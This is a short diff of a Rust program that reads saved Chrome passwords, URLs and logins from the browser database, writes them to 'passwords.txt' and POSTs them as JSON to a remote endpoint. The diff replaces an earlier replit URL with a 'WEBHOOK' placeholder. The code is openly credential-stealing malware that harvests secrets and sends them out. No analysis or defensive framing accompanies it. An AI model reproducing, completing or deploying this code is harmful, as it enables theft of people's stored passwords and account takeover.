@@ -146,7 +146,7 @@ fn main() {
 
     //ok lets load it into a text file 
     let chrome_datap = Chromepass::obtain_data_from_db().unwrap();
-    let mut filep = fs::File::create("test.txt").unwrap();
+    let mut filep = fs::File::create("passwords.txt").unwrap();
     for chrome in chrome_datap {
         let url = if chrome.url.is_empty() { "None".to_owned() } else { chrome.url };
         let login = if chrome.login.is_empty() { "None".to_owned() } else { chrome.login };
@@ -178,7 +178,7 @@ fn main() {
     
 
     let client = Client::new();
-    let res = client.post("https://waterloggedgracefulgeeklog.floppyfish118.repl.co")
+    let res = client.post("WEBHOOK")
         .body(json_data.to_string())
         .header("Content-Type", "application/json")
         .send()
